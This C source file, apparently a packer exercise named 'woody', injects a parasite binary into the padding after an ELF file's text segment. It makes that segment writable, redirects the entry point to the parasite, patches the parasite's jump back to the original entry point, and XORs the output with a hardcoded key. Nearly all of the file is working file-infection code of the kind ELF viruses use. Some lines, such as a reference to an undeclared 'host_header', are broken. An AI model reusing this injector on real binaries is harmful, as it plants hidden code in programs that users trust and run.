#include "wwp.h"
#include "color.h"

/********************  ALGORITHM   *********************

--- Load parasite from file into memory
1.	Get parasite_size and parasite_code addresss (location in allocated memory)


--- Find padding_size between .text segment and the NEXT segment after .text segment
2.	.text segment : increase
		-> p_filesz 		(by parasite size)
		-> p_memsz 			(by parasite size)
	Get and Set respectively,	
	padding_size 	= (offset of next segment (after .text segment)) - (end of .text segment)
	parasite_offset = (end of .text segment) or (end of last section of .text segment)


---	PATCH Host entry point
3.	Save original_entry_point (e_entry) and replace it with parasite_offset


--- PATCH SHT
4.  Find the last section in .text Segment and increase - 
        -> sh_size          (by parasite size)


--- PATCH Parasite offset
5.	Find and replace Parasite jmp exit addresss with original_entry_point 0x????????


---	Inject Parasite to Host @ host_mapping
6.	Inject parasite code to (host_mapping + parasite_offset)


7.	Write infection to disk x_x

*/

Elf64_Addr		parasite_load_address;			// parasite entry point (if parasite is LSB EXEC)
Elf64_Off		parasite_offset;				// Parasite entry point (if parasite is .so)
u_int64_t		parasite_size;					
int8_t			*parasite_code;					// Parasite residence (in memory before meeting its host )

Elf64_Off		text_segment_end_offset;		// Location to inject parasite

// Finds the placeholder (for address where our parasite code will jump after executing its body) and
// writes the host's entry point (original entry point address) to it.
void AddrPatcher(u_int8_t *parasite, long placeholder, long address)
{
	u_int8_t *ptr = parasite;

	int i;
	for (i = 0 ; i < parasite_size ; ++i)
	{
		long potential_placeholder = *((long *)(ptr + i));
		
		if ( !(placeholder ^ potential_placeholder) ) 
		{
			*((long *)(ptr + i)) = address;
			return;
		}
	}
}

// Patch SHT (i.e. find the last section of .text segment and increase its size by parasite_size)
void SHT_Patcher(void *ptr)
{
	Elf64_Ehdr	*elf_header 	= (Elf64_Ehdr *) ptr;	
	Elf64_Off	sht_offset 		= elf_header->e_shoff;
	u_int16_t	shnum			= elf_header->e_shnum;
    Elf64_Off	current_section_end_offset;

    // Point shdr (Pointer to iterate over SHT) to the last entry of SHT
    Elf64_Shdr *shdr = (Elf64_Shdr *) (ptr + sht_offset);

    int i;
    for ( i=0 ; i < shnum ; ++i )
    {
		current_section_end_offset = shdr[i].sh_offset + shdr[i].sh_size;
        if ( text_segment_end_offset == current_section_end_offset)
        {
            // This is the last section of .text Segment
			// Increase the sizeof this section by a parasite_size to accomodate parasite
            shdr[i].sh_size = shdr[i].sh_size + parasite_size;
			return ;
		}
    }
}

// Returns gap size (accomodation for parasite code in padding between .text segment and next segment 
// after .text segment) 
Elf64_Off PaddingSizeFinder(void *host_mapping)
{   
	Elf64_Ehdr	*elf_header	= (Elf64_Ehdr *) host_mapping;
	u_int16_t	phnum 		= elf_header->e_phnum;
	Elf64_Off	pht_offset 	= elf_header->e_phoff;
	Elf64_Phdr *phdr = (Elf64_Phdr *)(host_mapping + pht_offset);

	// Parse PHT entries
	u_int16_t TEXT_SEGMENT_FOUND = 0;
	int i;
	for ( i = 0 ; i < phnum ; ++i)
	{
		// Find the .text Segment (containing .text section)
		if (TEXT_SEGMENT_FOUND  == 0 &&
			phdr[i].p_type  == PT_LOAD &&
			phdr[i].p_flags == (PF_R | PF_X))
		{

			TEXT_SEGMENT_FOUND = 1;

			// Calculate the offset where the .text segment ends to bellow calculate padding_size 
			text_segment_end_offset	= phdr[i].p_offset + phdr[i].p_filesz;
			parasite_offset			= text_segment_end_offset;
			parasite_load_address	= phdr[i].p_vaddr  + phdr[i].p_filesz;


			// Increase its p_filesz and p_memsz by parasite_size (to accomodate parasite)
			phdr[i].p_filesz = phdr[i].p_filesz + parasite_size;
			phdr[i].p_memsz  = phdr[i].p_memsz  + parasite_size;

			// Make text segment writable
			phdr[i].p_flags = PF_R | PF_W | PF_X;
		}
		// Find next segment after .text Segment and calculate padding size
		if (TEXT_SEGMENT_FOUND  == 1		&&
			phdr[i].p_type  == PT_LOAD	&&
			phdr[i].p_flags == (PF_R | PF_W))
		{
			// Return padding_size (maximum size of parasite that host can accomodate in its 
			// padding between the end of .text segment and start of next loadable segment)
			return (phdr[i].p_offset - parasite_offset);
		}
	}

	return 0;
}

// Loads parasite code into memory and defines parasite_code and parasite_size variables
void ParasiteLoader(char *parasite_path)
{
	// Open parasite code
	int parasite_fd = open(parasite_path, O_RDONLY);
	if (parasite_fd == -1)
	{
		perror(RED"ParasiteLoader - open():"RESET);
		exit(0x60);
	}

	// Get the parasite_size using lstat() syscall
	struct stat buf;
	if ( lstat(parasite_path, &buf) != 0 )
	{
		perror(RED"ParasiteLoader - lstat():"RESET);
		exit(0x61);
	}

	// Initializing parasite_size and allocating space for parasite_code
	parasite_size = buf.st_size;
	if (!(parasite_code = (int8_t *)malloc(parasite_size)))
	{
		perror(RED"ParasiteLoader, malloc"RESET);
		exit(0x61);
	}

	// Load actual poison @ parasite_code (allocated memory on heap)
	int bytes_read = read(parasite_fd, parasite_code, parasite_size);
	if (bytes_read == -1)
	{
		perror(RED"ParasiteLoader - read():");
		exit(0x62);
	}

	close(parasite_fd);
}

int			write_woody(char *ptr, off_t size, char *filename)
{
	// DEBUG
	fprintf(stdout, BLUE"-x-x-x-x- "RED"\\_<O>_<O>_/ "BLUE"-x-x-x-x-\n"RED"-> "YELLOW"%s\n\n"RESET, filename); 

	Elf64_Ehdr *ehdr = (Elf64_Ehdr *) ptr;
	int HOST_IS_EXECUTABLE = 0;	// Host is LSB Executable and not Shared Object

	// Identify the binary & SKIP Relocatable, files and 32-bit class of binaries
    if ( ehdr->e_type == ET_REL || ehdr->e_type == ET_CORE )
    	return (0);
	else if ( ehdr->e_type == ET_EXEC )
		HOST_IS_EXECUTABLE = 1;
	else if ( ehdr->e_type == ET_DYN  )
		HOST_IS_EXECUTABLE = 0;
    if ( ehdr->e_ident[EI_CLASS] == ELFCLASS32 )
    	return (0);

	// Load Parasite into memory (from disk), uses extern 'parasite_path_for_exec' defined in main.c implicitly
	if (HOST_IS_EXECUTABLE)
		ParasiteLoader("./obj/ASM/exec_parasite.bin");
	else
		ParasiteLoader("./obj/ASM/so_parasite.bin");

	// Get Home size (in bytes) of parasite residence in host
	// and check if host's home size can accomodate a parasite this big in size
	Elf64_Off padding_size = PaddingSizeFinder(ptr);
	if (padding_size < parasite_size)
	{
		fprintf(stderr, RED"[+]"RESET" Host "YELLOW"%s"RESET" cannot accomodate parasite, parasite is angry "RED"x_x \n"RESET, filename); 
		return 0;
	}
	

	// Save original_entry_point of host and patch host entry point with parasite_offset
	Elf64_Addr original_entry_point = ehdr->e_entry; 
	if (HOST_IS_EXECUTABLE)
		ehdr->e_entry 	= parasite_load_address;
	else
		ehdr->e_entry 	= parasite_offset;


	// Patch SHT
	SHT_Patcher(ptr);

	// Patch Parasite jmp-on-exit address.
	AddrPatcher(parasite_code, 0xAAAAAAAAAAAAAAAA, original_entry_point);

	// Inject parasite in Host memory
	ft_memmove( (ptr + parasite_offset), parasite_code, parasite_size);

	//write memory in a new file
	int fd;
	if ((fd = open("woody", O_WRONLY | O_CREAT | O_TRUNC, 0644)) == -1)
		return (1);
	write(fd, ptr, size);
	close(fd);

	char	encryptedName[] = "encrypted";
	char	key[] = "pasta";
	int	enfd;
	char	*filestring = (char *)malloc(size);
	ft_memmove(filestring, ptr, size);
	if ((enfd = open(encryptedName, O_WRONLY | O_CREAT | O_TRUNC, 0644)) == -1)
	{
		fprintf(stderr, "couldn't make encryption file\n");
		return (1);
	}

	int keysize = ft_strlen(key);
	char a = 'a', b = ' ';
	printf("%c (0x%x) ^ %c (0x%x) => %c (0x%x)\n", a, (int)a, b, (int)b, a ^ b, (int)(a ^ b));
	printf("e_entry = %d, parasite size = %d, file size = %d\n", host_header->e_entry, parasite_size, size);
	for (int i = 0; i < size; i++)
	{
		//printf("%d ", i);
		filestring[i] ^= key[i % keysize];
	}
	//POUR L'INSTANT ENCRIPTE TOUT L'EXECUTABLE "encrypted" a partir d'une copie de woody
	//for (int i = host_header->e_entry  + parasite_size; i < size; i++)
        //	filestring[i] ^= key[i % keysize];


	write(enfd, filestring, size);
	close(enfd);
	free(filestring);
	printf("key: %s\n", key);


	// DEBUG
	fprintf(stdout, BLUE"[+]"RED" Infected x_x"RESET"  :  "GREEN"%s\n"RESET, filename);

	return 0;
}
